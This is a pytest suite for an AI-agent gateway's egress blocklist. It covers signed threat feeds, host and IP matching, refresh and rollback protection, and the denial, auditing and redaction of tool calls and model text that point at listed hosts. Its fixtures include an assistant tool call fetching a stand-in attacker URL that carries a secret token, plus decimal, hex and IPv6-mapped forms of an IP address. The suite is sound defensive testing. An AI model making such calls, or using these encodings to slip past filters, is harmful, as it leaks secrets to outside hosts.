"""Egress blocklist: feed parsing, matching, signed feeds, refresh and the gateway paths.

Design: docs/design/EGRESS_BLOCKLIST.md. Hermetic: in-memory feeds, temp files, a fake
resolver and clocks; nothing here touches the network.
"""

from __future__ import annotations

import dataclasses
import json
import textwrap

import pytest

from agentsec.sandbox import Policy, ToolGuard
from agentsec.sandbox.blocklist import Blocklist, parse_feed
from agentsec.sandbox.policy import ArgRule
from agentsec.sandbox.validators import check_url
from agentsec.types import ToolCall

pytest.importorskip("cryptography")
from cryptography.hazmat.primitives import serialization  # noqa: E402
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey  # noqa: E402

from agentsec.gateway.feeds import (  # noqa: E402
    EgressSettings,
    FeedConfig,
    FeedError,
    FeedSet,
    sign_feed,
    verify_feed,
)

BAD_NET = "185.220.101.0/24"  # public space, so the SSRF check does not deny it first
BAD_IP = "185.220.101.5"
GOOD_IP = "93.184.216.34"
SECRET_URL = "https://a.evil.example/collect?token=hunter2-very-secret"


def bl(**kw) -> Blocklist:
    return Blocklist.from_entries(domains=["evil.example"], networks=[BAD_NET, "2a00:1::/32"], **kw)


def resolver(table):
    calls = []

    def resolve(host):
        calls.append(host)
        if host not in table:
            raise OSError("NXDOMAIN")
        return table[host]

    resolve.calls = calls
    return resolve


def url_errors(url, blocklist, rule=None, table=None, hits=None):
    rule = rule or ArgRule(type="url")
    res = resolver(table or {})
    return check_url(url, rule, res, blocklist=blocklist, hits=hits), res


# --------------------------------------------------------------------------- parsing


def test_feed_parser_reads_comments_and_hosts_file_lines():
    ips = parse_feed(
        b"; Spamhaus DROP\n1.2.3.0/24 ; SBL1\n\n# c\n2a00:1::/32\n5.6.7.8\n", "ip", "drop"
    )
    assert ips.entries == 3
    doms = parse_feed(
        b"# urlhaus\n127.0.0.1\tEvil.Example.\n0.0.0.0 bad.test # x\nplain.test\n", "domain", "u"
    )
    assert doms.domains == {"evil.example", "bad.test", "plain.test"}


@pytest.mark.parametrize(
    ("data", "kind"),
    [
        (b"1.2.3.4/24\n", "ip"),  # host bits set: never silently widened
        (b"1.2.3.0/24\nnot-an-ip\n", "ip"),  # one bad line rejects the whole file
        ("bücher.example\n".encode(), "domain"),  # feeds must use punycode
        (b"evil.example/path\n", "domain"),
        (b"\xff\xfe\n", "domain"),
    ],
)
def test_malformed_feeds_are_rejected_whole(data, kind):
    with pytest.raises(ValueError):
        parse_feed(data, kind, "f")


# --------------------------------------------------------------------------- matching


@pytest.mark.parametrize(
    "url",
    [
        "https://evil.example/",
        "https://a.b.evil.example/x",
        "https://EVIL.example./",  # case and the trailing dot fetchers ignore
        f"https://{BAD_IP}/",
        "https://3118228741/",  # 185.220.101.5 as a decimal literal
        "https://0xb9dc6505/",  # ... and as hex
        "https://[::ffff:185.220.101.5]/",  # IPv4-mapped IPv6 checks as IPv4
        "https://185.220.101.0/",
        "https://185.220.101.255/",  # both ends of the network
        "https://[2a00:1::1]/",
    ],
)
def test_listed_hosts_are_denied(url):
    errors, _ = url_errors(url, bl())
    assert any("on blocklist" in e for e in errors), errors


@pytest.mark.parametrize(
    "url",
    [
        "https://notevil.example/",
        "https://evil.example.org/",
        "https://185.220.102.0/",
        "https://example/",
    ],
)
def test_unlisted_hosts_are_allowed(url):
    errors, _ = url_errors(
        url,
        bl(),
        table={"notevil.example": [GOOD_IP], "evil.example.org": [GOOD_IP], "example": [GOOD_IP]},
    )
    assert errors == []


def test_any_listed_address_of_a_name_denies_and_dns_runs_once():
    errors, res = url_errors("https://cdn.test/", bl(), table={"cdn.test": [GOOD_IP, BAD_IP]})
    assert errors == [f"host 'cdn.test' is on blocklist 'inline-ips' (matched '{BAD_NET}')"]
    assert res.calls == ["cdn.test"]  # the SSRF check and the blocklist share one lookup


def test_a_name_that_does_not_resolve_is_denied():
    errors, _ = url_errors("https://nowhere.test/", bl())
    assert errors == ["host 'nowhere.test' did not resolve"]


def test_resolve_dns_off_still_resolves_for_ip_lists_but_a_host_allowlist_does_not():
    rule = ArgRule(type="url", resolve_dns=False)
    errors, res = url_errors("https://cdn.test/", bl(), rule=rule, table={"cdn.test": [BAD_IP]})
    assert errors and res.calls == ["cdn.test"]
    allow = ArgRule(type="url", hosts=["*.test"])
    errors, res = url_errors("https://cdn.test/", bl(), rule=allow, table={"cdn.test": [BAD_IP]})
    assert errors == [] and res.calls == []
    # The allowlist does not exempt a listed domain under it.
    errors, _ = url_errors(
        "https://x.evil.example/", bl(), rule=ArgRule(type="url", hosts=["*.example"])
    )
    assert errors


def test_except_hosts_override_the_feeds():
    lst = Blocklist(bl().feeds, except_hosts=["safe.evil.example"])
    assert (
        url_errors("https://safe.evil.example/", lst, table={"safe.evil.example": [GOOD_IP]})[0]
        == []
    )
    assert url_errors("https://other.evil.example/", lst)[0]


# --------------------------------------------------------------------------- stale feeds


def stale_list(on_stale, now=10_000.0):
    feed = parse_feed(
        b"evil.example\n", "domain", "u", issued_at=0.0, max_age_s=3600, on_stale=on_stale
    )
    return Blocklist([feed], clock=lambda: now)


def test_stale_feed_with_warn_keeps_blocking_and_allows_the_rest():
    lst = stale_list("warn")
    assert url_errors("https://ok.test/", lst, table={"ok.test": [GOOD_IP]})[0] == []
    assert url_errors("https://evil.example/", lst)[0]


def test_stale_feed_with_deny_refuses_every_url():
    errors, _ = url_errors("https://ok.test/", stale_list("deny"), table={"ok.test": [GOOD_IP]})
    assert errors == ["blocklist 'u' is stale"]
    fresh = stale_list("deny", now=100.0)
    assert url_errors("https://ok.test/", fresh, table={"ok.test": [GOOD_IP]})[0] == []


# --------------------------------------------------------------------------- ToolGuard


class Sink:
    def __init__(self):
        self.records = []

    def log(self, event, **data):
        self.records.append({"event": event, "data": data})


POLICY = Policy.from_dict(
    {"tools": {"fetch": {"args": {"url": {"type": "url", "required": True}}}}}
)


def test_guard_denies_and_audits_without_the_url():
    audit = Sink()
    guard = ToolGuard(POLICY, audit=audit, blocklist=bl())
    decision = guard.authorize(ToolCall(name="fetch", arguments={"url": SECRET_URL}))
    assert not decision.allowed
    (rec,) = [r["data"] for r in audit.records if r["event"] == "egress_blocked"]
    assert rec["source"] == "tool_call" and rec["tool"] == "fetch" and rec["argument"] == "url"
    assert rec["host"] == "a.evil.example" and rec["entry"] == "evil.example"
    assert rec["list"] == "inline-domains" and len(rec["list_sha256"]) == 64
    assert len(rec["url_sha256"]) == 64
    assert "hunter2" not in json.dumps(rec) and SECRET_URL not in json.dumps(rec)


def test_guard_without_a_blocklist_is_unchanged():
    # dlp=None: the token in SECRET_URL is a DLP finding, which is not what this test is about.
    guard = ToolGuard(POLICY, resolver=lambda h: [GOOD_IP], dlp=None)
    assert guard.evaluate(ToolCall(name="fetch", arguments={"url": SECRET_URL})).allowed
    assert (
        not ToolGuard(POLICY, resolver=lambda h: [GOOD_IP])
        .evaluate(ToolCall(name="fetch", arguments={"url": SECRET_URL}))
        .allowed
    )  # with the default DLP policy the token in the query is refused


def test_a_blocklist_needing_dns_moves_async_evaluation_off_the_loop():
    guard = ToolGuard(POLICY)
    guard.blocklist = Blocklist.from_entries(domains=["evil.example"])
    assert guard._blocking_eval  # the url rule resolves anyway
    no_dns = Policy.from_dict(
        {"tools": {"f": {"args": {"u": {"type": "url", "hosts": ["a.test"]}}}}}
    )
    g = ToolGuard(no_dns, blocklist=Blocklist.from_entries(domains=["x.test"]))
    assert not g._blocking_eval
    g.blocklist = bl()
    assert g._blocking_eval


# --------------------------------------------------------------------------- signed feeds


@pytest.fixture
def keys(tmp_path):
    priv = Ed25519PrivateKey.generate()
    pem = priv.private_bytes(
        serialization.Encoding.PEM, serialization.PrivateFormat.PKCS8, serialization.NoEncryption()
    )
    pub = priv.public_key().public_bytes(
        serialization.Encoding.PEM, serialization.PublicFormat.SubjectPublicKeyInfo
    )
    (tmp_path / "feeds.pub").write_bytes(pub)
    return pem, priv.public_key()


def write_feed(path, text, pem, name, issued_at):
    path.write_bytes(text.encode())  # no newline translation on Windows
    sign_feed(path, pem, name, issued_at=issued_at)


def test_a_signed_feed_verifies(tmp_path, keys):
    pem, pub = keys
    write_feed(tmp_path / "u.txt", "evil.example\n", pem, "u", 1000)
    data, issued = verify_feed(tmp_path / "u.txt", "u", pub, now=2000)
    assert data == b"evil.example\n" and issued == 1000


@pytest.mark.parametrize(
    "tamper", ["no_sig", "other_key", "flip_byte", "renamed", "future", "garbage"]
)
def test_feed_signature_rejections(tmp_path, keys, tamper):
    pem, pub = keys
    feed = tmp_path / "u.txt"
    write_feed(feed, "evil.example\n", pem, "u", 1000)
    sig = tmp_path / "u.txt.sig"
    if tamper == "no_sig":
        sig.unlink()
    elif tamper == "other_key":
        other = Ed25519PrivateKey.generate().private_bytes(
            serialization.Encoding.PEM,
            serialization.PrivateFormat.PKCS8,
            serialization.NoEncryption(),
        )
        sign_feed(feed, other, "u", issued_at=1000)
    elif tamper == "flip_byte":
        feed.write_text("evil.exampla\n")
    elif tamper == "renamed":
        sign_feed(feed, pem, "drop", issued_at=1000)  # a valid signature for another list
    elif tamper == "future":
        sign_feed(feed, pem, "u", issued_at=10_000)
    else:
        sig.write_text("{not json")
    with pytest.raises(FeedError):
        verify_feed(feed, "u", pub, now=2000)


def settings(tmp_path, keys, **kw):
    from agentsec.gateway.bundle import load_public_key

    feeds = kw.pop("feeds", (FeedConfig("u", "domain", str(tmp_path / "u.txt"), 3600),))
    return EgressSettings(
        feeds=tuple(feeds), public_key=load_public_key((tmp_path / "feeds.pub").read_bytes()), **kw
    )


class Clock:
    def __init__(self, t):
        self.t = t

    def __call__(self):
        return self.t


def test_feedset_refuses_to_start_on_a_bad_feed(tmp_path, keys):
    (tmp_path / "u.txt").write_text("evil.example\n")  # unsigned
    with pytest.raises(FeedError):
        FeedSet(settings(tmp_path, keys))


def test_feedset_refresh_swaps_keeps_last_good_and_refuses_rollback(tmp_path, keys):
    pem, _ = keys
    write_feed(tmp_path / "u.txt", "evil.example\n", pem, "u", 1000)
    wall, mono = Clock(1100), Clock(0)
    fs = FeedSet(
        settings(tmp_path, keys, state_file=str(tmp_path / "state.json")),
        wall_clock=wall,
        clock=mono,
    )
    first = fs.current
    assert first.match_domain("evil.example")

    write_feed(tmp_path / "u.txt", "worse.example\n", pem, "u", 1050)
    mono.t = 100
    events = fs.refresh()
    assert [e for e, _ in events] == ["gateway_blocklist_loaded"]
    assert fs.current is not first and fs.current.match_domain("worse.example")
    assert first.match_domain("evil.example")  # a request in flight keeps its list

    (tmp_path / "u.txt").write_text("tampered.example\n")  # signature no longer matches
    mono.t = 200
    events = fs.refresh()
    assert [e for e, _ in events] == ["gateway_blocklist_reload_failed"]
    assert fs.current.match_domain("worse.example")
    mono.t = 300
    assert fs.refresh() == []  # the same failure is logged once

    write_feed(tmp_path / "u.txt", "old.example\n", pem, "u", 1000)  # replay of an older feed
    mono.t = 400
    ((event, data),) = fs.refresh()
    assert event == "gateway_blocklist_reload_failed" and "rollback" in data["reason"]

    # The floor survives a restart through the state file.
    with pytest.raises(FeedError, match="rollback"):
        FeedSet(settings(tmp_path, keys, state_file=str(tmp_path / "state.json")), wall_clock=wall)


def test_feedset_reports_stale_feeds_once_per_hour(tmp_path, keys):
    pem, _ = keys
    write_feed(tmp_path / "u.txt", "evil.example\n", pem, "u", 0)
    wall, mono = Clock(10_000), Clock(0)
    fs = FeedSet(settings(tmp_path, keys), wall_clock=wall, clock=mono)
    assert fs.stale() == ["u"] and fs.ages() == {"u": 10_000}
    mono.t = 100
    assert [e for e, _ in fs.refresh()] == ["gateway_blocklist_stale"]
    mono.t, wall.t = 200, 10_100
    assert fs.refresh() == []
    mono.t, wall.t = 300, 10_000 + 3600
    assert [e for e, _ in fs.refresh()] == ["gateway_blocklist_stale"]


# --------------------------------------------------------------------------- gateway

GW_POLICY = """
version: 1
taint: {enabled: false}
tools:
  fetch:
    args:
      url: {type: url, required: true}
"""


def gw_config(tmp_path, keys, mode="enforce", extra=""):
    from agentsec.gateway import load_config

    pem, _ = keys
    write_feed(tmp_path / "u.txt", "evil.example\n", pem, "urlhaus", 0)
    write_feed(tmp_path / "drop.txt", f"{BAD_NET} ; SBL1\n", pem, "drop", 0)
    (tmp_path / "policy.yaml").write_text(GW_POLICY)
    (tmp_path / "gateway.yaml").write_text(
        textwrap.dedent(
            f"""
            identity: {{trusted_proxies: [127.0.0.1/32]}}
            policy: policy.yaml
            mode: {mode}
            upstreams: {{local: {{url: "http://127.0.0.1:11434/v1", model: m}}}}
            audit: {{file: audit.jsonl}}
            egress:
              public_key_file: feeds.pub
              blocklists:
                - {{name: urlhaus, kind: domain, file: u.txt, max_age_h: 1000000}}
                - {{name: drop, kind: ip, file: drop.txt, max_age_h: 1000000}}
            """
        )
        + textwrap.dedent(extra)
    )
    return load_config(tmp_path / "gateway.yaml")


def gw(tmp_path, keys, message, **kw):
    from agentsec.gateway import Gateway
    from agentsec.middleware.audit import MemorySink
    from tests.test_gateway import FakeUpstream

    sink = MemorySink()
    app = Gateway(gw_config(tmp_path, keys, **kw), transport=FakeUpstream(message), sink=sink)
    return app, sink


def fetch_call(url, id_="c1"):
    return {
        "id": id_,
        "type": "function",
        "function": {"name": "fetch", "arguments": json.dumps({"url": url})},
    }


def test_gateway_strips_a_blocklisted_tool_call_and_audits_it(tmp_path, keys):
    from tests.test_gateway import call, chat

    message = {"role": "assistant", "content": None,
               "tool_calls": [fetch_call(SECRET_URL), fetch_call(f"https://{GOOD_IP}/ok", "c2")]}  # fmt: skip
    app, sink = gw(tmp_path, keys, message)
    status, out = call(app, body=chat())
    (kept,) = out["choices"][0]["message"]["tool_calls"]
    assert status == 200 and GOOD_IP in kept["function"]["arguments"]
    events = [r["event"] for r in sink.records]
    assert events.count("gateway_blocklist_loaded") == 2
    (rec,) = [r["data"] for r in sink.records if r["event"] == "egress_blocked"]
    assert rec["list"] == "urlhaus" and rec["host"] == "a.evil.example"
    assert "hunter2" not in json.dumps(rec)


def test_gateway_monitor_mode_keeps_the_call_but_audits(tmp_path, keys):
    from tests.test_gateway import call, chat

    message = {
        "role": "assistant",
        "content": None,
        "tool_calls": [fetch_call(f"https://{BAD_IP}/")],
    }
    app, sink = gw(tmp_path, keys, message, mode="monitor")
    _, out = call(app, body=chat())
    assert len(out["choices"][0]["message"]["tool_calls"]) == 1
    (rec,) = [r["data"] for r in sink.records if r["event"] == "egress_blocked"]
    assert rec["matched"] == "ip" and rec["entry"] == BAD_NET


def test_gateway_redacts_listed_links_in_model_text_without_dns(tmp_path, keys, monkeypatch):
    from tests.test_gateway import call, chat

    def no_dns(host):
        raise AssertionError(f"model text must not trigger DNS ({host})")

    monkeypatch.setattr("agentsec.sandbox.validators._default_resolver", no_dns)
    text = "See https://cdn.evil.example/x?k=hunter2 and ![i](https://185.220.101.9/p.png)"
    app, sink = gw(tmp_path, keys, {"role": "assistant", "content": text},
                   extra="output: {allowed_hosts: ['*.example', '185.220.101.9']}\n")  # fmt: skip
    _, out = call(app, body=chat())
    content = out["choices"][0]["message"]["content"]
    assert "evil.example" not in content and "185.220.101.9" not in content
    recs = [r["data"] for r in sink.records if r["event"] == "egress_blocked"]
    assert {r["source"] for r in recs} == {"model_text"} and len(recs) == 2
    assert "hunter2" not in json.dumps(recs)


def test_gateway_refuses_to_start_with_an_unsigned_feed(tmp_path, keys):
    from agentsec.gateway import Gateway

    cfg = gw_config(tmp_path, keys)
    (tmp_path / "u.txt.sig").unlink()
    with pytest.raises(FeedError):
        Gateway(cfg, sink=__import__("agentsec.middleware.audit", fromlist=["x"]).MemorySink())


def test_readyz_and_metrics_show_stale_feeds(tmp_path, keys):
    from tests.test_gateway_metrics import admin

    pem, _ = keys
    app, _ = gw(tmp_path, keys, None, extra="admin: {port: 9}\n")
    status, body = admin(app, "/readyz")
    assert status == 200 and json.loads(body)["blocklist_stale"] == []
    _, metrics = admin(app, "/metrics")
    assert 'agentsec_gateway_blocklist_age_seconds{list="drop"}' in metrics


@pytest.mark.parametrize(
    ("egress", "error"),
    [
        ("egress: {public_key_file: feeds.pub, blocklists: []}", "non-empty"),
        (
            "egress: {public_key_file: feeds.pub, blocklists: [{name: a, kind: url, file: a}]}",
            "kind",
        ),
        (
            "egress: {public_key_file: feeds.pub, on_stale: maybe, blocklists: [{name: a, kind: ip, file: a}]}",
            "on_stale",
        ),
        ("egress: {blocklists: [{name: a, kind: ip, file: a}]}", "public_key_file"),
        (
            "egress: {public_key_file: feeds.pub, blocklists: [{name: a, kind: ip, file: a, extra: 1}]}",
            "unknown",
        ),
    ],
)
def test_egress_config_is_strict(tmp_path, keys, egress, error):
    from agentsec.gateway import ConfigError, load_config

    (tmp_path / "policy.yaml").write_text(GW_POLICY)
    (tmp_path / "gateway.yaml").write_text(
        "identity: {trusted_proxies: [127.0.0.1/32]}\npolicy: policy.yaml\n"
        "upstreams: {local: {url: 'http://127.0.0.1:1/v1', model: m}}\naudit: {file: a.jsonl}\n"
        + egress
    )
    with pytest.raises(ConfigError, match=error):
        load_config(tmp_path / "gateway.yaml")


def test_cli_sign_and_check_feed(tmp_path, keys, monkeypatch, capsys):
    from agentsec.cli import main

    pem, _ = keys
    (tmp_path / "feed.key").write_bytes(pem)
    (tmp_path / "drop.txt").write_text(f"{BAD_NET}\n")
    assert main(["egress", "sign-feed", str(tmp_path / "drop.txt"), "--kind", "ip", "--name", "drop",
                 "--key", f"file:{tmp_path / 'feed.key'}"]) == 0  # fmt: skip
    check = ["egress", "check-feed", str(tmp_path / "drop.txt"), "--kind", "ip", "--name", "drop"]
    assert main([*check, "--public-key", str(tmp_path / "feeds.pub")]) == 0
    assert main([*check[:-1], "urlhaus", "--public-key", str(tmp_path / "feeds.pub")]) == 1
    (tmp_path / "bad.txt").write_text("nope\n")
    assert main(["egress", "sign-feed", str(tmp_path / "bad.txt"), "--kind", "ip", "--name", "x",
                 "--key", f"file:{tmp_path / 'feed.key'}"]) == 1  # fmt: skip
    assert not (tmp_path / "bad.txt.sig").exists()


def test_mcp_gateway_denies_a_blocklisted_url_before_the_upstream(tmp_path, keys):
    pytest.importorskip("mcp")
    pytest.importorskip("uvicorn")
    from mcp.server.mcpserver import MCPServer

    from agentsec.gateway import Gateway, load_config
    from agentsec.middleware.audit import MemorySink
    from tests.test_gateway_mcp import Upstreams, client, run, serving

    fetched = []
    srv = MCPServer("web")

    @srv.tool(description="Fetch a page")
    def fetch(url: str) -> str:
        fetched.append(url)
        return "page"

    gw_config(tmp_path, keys)  # writes the signed feeds and the key
    (tmp_path / "policy.yaml").write_text(
        "version: 1\ntools:\n  web__fetch:\n    args:\n      url: {type: url, required: true}\n"
    )
    cfg = (tmp_path / "gateway.yaml").read_text()
    (tmp_path / "gateway.yaml").write_text(
        cfg + 'mcp_upstreams: {web: {url: "https://web.internal/mcp"}}\n'
    )
    sink = MemorySink()
    app = Gateway(
        load_config(tmp_path / "gateway.yaml"), sink=sink, mcp_connector=Upstreams(web=srv).connect
    )

    async def main(url):
        async with client(server_url) as c:
            await c.list_tools()
            return await c.call_tool("web__fetch", {"url": url})

    with serving(app) as server_url:
        denied = run(main(SECRET_URL))
        allowed = run(main(f"https://{GOOD_IP}/"))
    assert denied.is_error and not allowed.is_error
    assert fetched == [f"https://{GOOD_IP}/"]  # the listed URL never reached the upstream
    (rec,) = [r["data"] for r in sink.records if r["event"] == "egress_blocked"]
    assert rec["tool"] == "web__fetch" and "hunter2" not in json.dumps(rec)


def test_dashboard_shows_feed_status(tmp_path, keys):
    from tests.test_gateway_metrics import admin

    app, _ = gw(tmp_path, keys, None, extra="admin: {port: 9}\n")
    status, page = admin(app, "/dashboard")
    assert status == 200 and "Egress feeds" in page
    assert "<td>urlhaus</td><td>domain</td><td>1</td>" in page and "fresh" in page
    app._feeds.current = Blocklist(
        [dataclasses.replace(f, max_age_s=1.0) for f in app._feeds.current.feeds]
    )
    _, page = admin(app, "/dashboard")
    assert "stale (warn)" in page


def test_tool_request_records_hash_url_arguments_whatever_log_content_says():
    from agentsec.middleware.audit import AuditLogger, MemorySink

    sink = MemorySink()
    policy = Policy.from_dict(
        {"tools": {"fetch": {"args": {"url": {"type": "url"}, "note": {"type": "string"}}}}}
    )
    guard = ToolGuard(
        policy, audit=AuditLogger(sink, log_content=True), resolver=lambda h: [GOOD_IP]
    )
    url = "https://ok.test/?t=hunter2"
    guard.authorize(ToolCall(name="fetch", arguments={"url": url, "note": "hi"}))
    (req,) = [r["data"] for r in sink.records if r["event"] == "tool_request"]
    assert req["arguments"]["url"].startswith("sha256:") and req["arguments"]["note"] == "hi"
    assert "hunter2" not in json.dumps(sink.records)
